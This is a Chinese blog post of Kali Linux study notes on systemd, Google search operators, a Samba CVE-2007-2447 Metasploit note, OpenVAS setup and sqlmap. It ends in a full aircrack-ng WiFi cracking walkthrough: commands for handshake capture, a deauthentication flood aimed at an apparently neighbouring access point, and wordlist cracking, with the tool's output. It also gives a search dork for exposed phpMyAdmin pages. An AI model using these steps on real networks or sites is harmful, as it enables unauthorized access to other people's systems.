---
layout: post
title: "kali-linux-note"
date: 2017-10-17 11:56:10
image: 'kali-Linux-Destop.jpg'
description: 关于学习kali-Linux的笔记
category: '计算机'
tags:
- 计算机技术
twitter_text: 关于学习kali-Linux的笔记
introduction: 关于学习kali-Linux的笔记
color: '4A3341'
author: 夜雨
---

### Systemd

Systemd是一种新的linux系统服务管理器。它替换了init系统，能够管理系统的启动过程和一些系统服务，一旦启动起来，就将监管整个系统。

#### 切换至字符界面
```shell
sudo systemctl set-default multi-user.target
```

#### 切换至图形界面
```shell
sudo systemctlset-default graphical.target
```

#### 打开图形界面
```shell
sudo init 5
```



## google hack

### 默认搜索模式

google默认搜索模式为模糊搜索，并且可能会把长句或长短语拆分成更小的词进行搜索。

示例：这是一个测试

![默认模式测试截图1]({{site.url}}/images/google-hack-test01.jpg)  ![默认模式测试截图2]({{site.url}}/images/google-hack-test01-01.jpg)

### 短语精确搜索

示例："这是一个测试"

对搜索短语加上英文双引号进行精确搜索模式搜索，不再对短语进行拆分。

![精确搜索测试截图]({{site.url}}/images/google-hack-test02.jpg)

### 通配符

示例："这*个测试"

通配符是指星号“*”。该选项必须在使用精确搜索引号内部使用。

![通配符测试截图]({{site.url}}/images/google-hack-test03.jpg)

### 点号匹配

示例："这.一个测试"

点号是指”.“，就是英文当中的句号。匹配的是单个字符，不是字词短语等内容。需要注意的是这个选项也需要在使用精确匹配的双引号当中使用。

![点号匹配测试截图]({{site.url}}/images/google-hack-test04.jpg)

### 布尔逻辑

在Google中多个词之间的空格表示默认的逻辑与。当使用逻辑关系运算符时，词语与逻辑运算符之间需要使用空格分隔，包括之后的其他语法。逻辑非是特例——即减号与对应的连在一起。对于更为复杂的逻辑运算，可使用括号进行分组。

#### 逻辑与

示例1："这是一个" "测试"

示例2："这是一个" and "测试"

![逻辑与测试截图1]({{site.url}}/images/google-hack-test05.jpg)

![逻辑与测试截图2]({{site.url}}/images/google-hack-test05-01.jpg)

#### 逻辑或

逻辑或和逻辑与类似。但是，逻辑或使用的是符号"\|"。并且逻辑或的结果只要包含其中之一就行。

示例："这是一个" \| "测试"

![逻辑或测试截图]({{site.url}}/images/google-hack-test06.jpg)

#### 逻辑非

示例："这是一个" -"测试"

![逻辑非测试截图]({{site.url}}/images/google-hack-test07.jpg)

### 条件约束

示例："这是一个测试" + "测试"

可以使用加号”+“进行条件约束搜索。加在加号后面的内容必须包含在搜索结果中。一般与精确搜索配合使用。

![条件约束测试截图]({{site.url}}/images/google-hack-test08.jpg)

### 数字范围

示例："这是一个测试" 2016..2017年

”..“两个点表示一个数字范围。应用于日期、货币、尺寸、重量、高度等单位范围搜索。用作范围界定时最好给定单位。否则搜索结果可能是无用的数据。

![数值范围测试截图]({{site.url}}/images/google-hack-test09.jpg)

### 括号分组

括号”()“是分组符号，主要是为了避免逻辑混乱。

示例：()"这是一个") | ("测试")

![括号分组测试截图]({{site.url}}/images/google-hack-test10.jpg)

### 标题搜索

示例：intitle:"这是一个测试"

![标题搜索测试截图]({{site.url}}/images/google-hack-test11.jpg)

### 正文搜索

示例：intext:"这是一个测试"

![正文搜索测试截图]({{site.url}}/images/google-hack-test12.jpg)

### 网址中搜索

示例：inurl:this is a test

![网址中搜索测试截图]({{site.url}}/images/google-hack-test13.jpg)

### 锚链链接搜索

示例：inanchor:"这是一个测试"

![锚链链接搜索测试截图]({{site.url}}/images/google-hack-test14.jpg)

### 文档类型搜索

示例：filetype:sql

![文档类型搜索测试截图]({{site.url}}/images/google-hack-test15.jpg)

### 缓存搜索（快照搜索）

示例：cache:43all.me

![缓存搜索测试截图]({{site.url}}/images/google-hack-test16.jpg)

### 相关网站搜索

示例：ralated:www.kali.org

![相关网站搜索测试截图]({{site.url}}/images/google-hack-test17.jpg)

### 链接搜索

示例：link:www.kali.org

![链接搜索测试截图]({{site.url}}/images/google-hack-test18.jpg)

### 网站搜索

示例：site:www.kali.org

![网站搜索测试截图]({{site.url}}/images/google-hack-test19.jpg)

### 混合搜索

示例：inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin

![混合搜索测试截图1]({{site.url}}/images/google-hack-test20.jpg)

点开一个网站之后的截图如下：

![混合搜索测试截图2]({{site.url}}/images/google-hack-test21.jpg)



## Metasploit

#### usermap_script 漏洞相关笔记
- usermap_script：CVE-2007-2447
>利用Samba用户名映射脚本命令执行
>这个模块利用漏洞执行命令，在Samba版本3.0.20到3.0.25rc3当使用非默认用户名映射脚本配置选项。 
>通过指定一个用户名包含shell元字符,攻击者可以执行任意命令。 
>不需要身份验证来利用此漏洞，因为此选项用于在身份验证之前映射用户名
>模块的位置 exploit/multi/samba/usermap_script
>用户输入未转义的参数作为参数传递到/bin/sh，允许远程命令执行
>此漏洞最初是针对匿名呼叫报告的
> 经过Samba开发者的进一步调查，结果是确定了问题更广泛和影响远程打印机和文件共享管理。 根本原因是传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用/bin/sh，在smb.conf中。 
> 然而，不同于"username map script"漏洞，远程文件和打印机管理脚本需要经过身份验证的用户会话。
>
> 漏洞的时间线：
>
>    1. 2007年5月7日：漏洞匿名披露到security@samba.org电子邮件列表中。
>    2. 2007年5月7日：Samba的开发人员Gerald Carter开始响应这个漏洞。
>    3. 2007年5月9日：Samba的开发者Jeremy Allison发布了补丁，用于iDefense测试。
>    4. 2007年5月10日：向vendor-sec邮件列表发布通知。
>    5. 2007年5月14日：公开漏洞信息。



### OpenVas安装

```shell
sudo apt-get install openvas
sudo openvas-setup
```

安装过程中，会被询问关于redis的问题，选择默认选项来以Unix套接字运行。

即使是有快速的网络连接，openvas-setup 仍需要很长时间来下载和更新所有所需的 CVE、SCAP 定义。

请注意 openvas-setup 的命令输出，密码会在安装过程中生成，并在安装的最后在控制台中打印出来。

验证 openvas 正在运行:

```shell
netstat -tulpn
```

在 Kali 中启动 OpenVAS：

```shell
openvas-start
```

安装后，你应该可以通过 `https://127.0.0.1:9392` 访问 OpenVAS 的 web 程序了。

接受自签名证书，并使用 openvas-setup 输出的 admin 凭证和密码登录程序。

接受自签名证书后，你应该可以看到登录界面了。

### linux命令之ubuntu 重启网络服务而不需重启
```shell
sudo /etc/init.d/networking restart
```

## sqlmap学习笔记

```shell
sqlmap -u URL [options]
```
## aircrack-ng无线网络WIFI密码破解
### 检查无线网卡是否加载成功
```shell
lm test # iwconfig 
enp9s0    no wireless extensions.

lo        no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=16 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
          
wlp6s0    IEEE 802.11  ESSID:"Netcore_00C9EF"  
          Mode:Managed  Frequency:2.437 GHz  Access Point: 08:10:7A:00:C9:EF   
          Bit Rate=72.2 Mb/s   Tx-Power=16 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality=44/70  Signal level=-66 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:67  Invalid misc:842   Missed beacon:0
```

### 检查附近网络状况
```shell
lm test # airodump-ng mon0

CH 11 ][ Elapsed: 2 mins ][ 2018-04-25 20:50                                    
                                                                                 
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                 
 08:10:7A:00:C9:EF  -23     5419    11700 1202   6  54e  WPA2 CCMP   PSK  Netcore
 8C:A6:DF:01:EF:7C  -57     1303      687    9   6  54e. WPA2 CCMP   PSK  TP-LINK
 EC:3D:FD:E2:86:22  -65       17        1    0   4  54e  WPA2 CCMP   PSK  B-LINK_
 50:3A:A0:CC:01:AA  -83      639        0    0   6  54e. WPA2 CCMP   PSK  MERCURY
 BC:46:99:69:EF:B4  -88      874        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK
 08:10:77:A4:CD:14  -92       16       53    0   6  54e  WPA2 CCMP   PSK  10086   
 6C:59:40:C2:5F:EC  -64        1        1    0  13  54e  WPA2 CCMP   PSK  <length 
 0C:D8:6C:25:04:D4  -69        2        0    0  12  54e  WPA2 CCMP   PSK  <length 
 C8:3A:35:35:FC:A8  -88        1        0    0   4  54e  WPA  CCMP   PSK  Tenda_3 
 C6:BB:4C:07:65:00  -85      191        0    0   6  54e  WPA2 CCMP   PSK  IOV_HS1 
 1C:60:DE:F9:C1:80  -84        1        0    0   1  54e. WPA2 CCMP   PSK  LLLLL   
 E4:D3:32:8B:0A:70  -50        2        0    0   1  54e. WPA2 CCMP   PSK  <length 
                                                                                  
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe       �
                                                                                  
 (not associated)   DA:A1:19:09:2E:13  -61    0 - 1      0       22  10086,TP-LINK
 (not associated)   D4:50:3F:81:AF:AB  -62    0 - 1      0       28               
 (not associated)   DA:A1:19:53:F2:A6  -76    0 - 1      0        2               
 (not associated)   0A:F8:20:1A:34:8B  -77    0 - 1      0        3               
 (not associated)   F4:E3:FB:AA:5F:FC  -82    0 - 1      4        5  99,123       
 (not associated)   5C:CF:7F:DE:22:D5  -84    0 - 1      0       13               
 (not associated)   1C:DD:EA:6B:F5:93  -85    0 - 1      0        2               
 (not associated)   DA:A1:19:AD:BA:35  -86    0 - 6      0        1               
 (not associated)   7A:9F:81:6A:3E:00  -86    0 - 1      0        2               
 (not associated)   BE:4D:85:21:8B:83  -86    0 - 1      0        2               
 (not associated)   AA:AF:CC:B1:E9:B2  -89    0 - 1      0        1               
 (not associated)   8A:47:E1:5C:B8:D0  -89    0 - 1      0        2               
 (not associated)   F0:79:E8:A4:61:A5  -91    0 - 1      0        2  �.���.�.��.��
 (not associated)   92:A2:A9:60:C2:62  -91    0 - 1      0        1               
 (not associated)   1E:C3:F6:F8:B9:BF  -92    0 - 1      0        1               
 (not associated)   DA:A1:19:75:B9:34  -79    0 - 6      0        2               
 (not associated)   F2:75:03:E8:79:63  -84    0 - 1      0        1               
 (not associated)   E4:47:90:C7:02:85  -89    0 - 1      0        1               
 (not associated)   DA:A1:19:56:2C:A7  -88    0 - 6      0        1               
 (not associated)   64:CC:2E:63:84:43  -86    0 - 1      0        1               
 (not associated)   38:A4:ED:42:99:A5  -92    0 - 1      0        8  ChinaNet-JxXv
 (not associated)   DA:A1:19:C6:1B:96  -87    0 - 6      0        2               
 (not associated)   CC:2D:83:41:7D:48  -94    0 - 1      0        1  gcabc        
```

### 抓握手包
```shell
lm test # airodump-ng -c 4 --bssid EC:3D:FD:E2:86:22 -w hacku mon0 --ignore-negative-one
```
> -c chanel(频道) 
> --bssid 指定抓包的WiFi主机的MAC地址
> -w 抓包记录文件命名
> mon0 网卡编号
> --ignore-negative-one 避免自带Bug

### 加速抓握手包
为了加速握手包的获取，使用aireplay向AP发送断开包

```shell
lm test # aireplay-ng -0 0 -a EC:3D:FD:E2:86:22 mon0 --ignore-negative-one
```
### 握手包成功抓取标志
成功抓取握手包之后会在右上角出现 **[ WPA handshake: 08:10:7A:00:C9:EF**的标志

### 下载密码本
```shell
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

### 利用抓到的握手包破解WIFI密码
```shell
lm test # aircrack-ng hacku-01.cap -w ./rockyou.txt
```

### WIFI密码破解成功的标志
```shell
                                 Aircrack-ng 1.2 beta3


                   [00:00:00] 16 keys tested (582.90 k/s)


                           KEY FOUND! [ 123456789 ]


      Master Key     : 9A 2D 4B 9D 59 59 7B 9E 9F 81 B5 D1 B9 E4 3A E3 
                       3E 84 D3 DC FB 9A 8A 02 2D 5C C0 BD 13 CE 7E BF 

      Transient Key  : C3 B0 0E B5 DC E8 89 CB DF 2F 3D B4 65 6E 92 44 
                       78 37 69 3E 54 A5 C4 B2 12 F4 B2 F4 56 D8 EE 36 
                       44 D8 49 CF F6 2C 5E 39 16 27 49 64 7A 0E B8 DB 
                       71 1A 3C 4E 8D D8 50 9A 9D 68 BE DF 3D 86 07 2A 

      EAPOL HMAC     : 4C D6 17 43 FF E3 7E F8 CD 43 A2 91 3E A8 2A E0 
```

### 参考文献
>[wifi-cracking](https://github.com/brannondorsey/wifi-cracking)

>[aircrack-ng无线网WIFI破解教程(下) – WIFI破解实战](http://www.vuln.cn/2683)
